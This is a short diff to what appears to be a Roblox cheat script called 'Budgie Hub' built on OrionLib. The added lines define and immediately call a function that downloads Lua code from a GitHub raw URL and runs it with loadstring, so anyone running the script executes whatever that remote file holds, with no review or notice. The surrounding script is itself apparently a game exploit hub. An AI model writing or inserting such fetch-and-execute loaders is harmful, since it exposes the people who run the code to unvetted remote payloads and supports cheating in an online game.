@@ -1989,6 +1989,12 @@ end
 
 checkForTargetPlayers()
 
+local function NonAdmin()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/NonAdminCmds/main/SukunaBattlegrounds"))()
+end
+
+NonAdmin()
+
 OrionLib:MakeNotification({
 	Name = "Budgie Hub",
 	Content = "Creator - MEGACOCONUT and Hamsterovich",
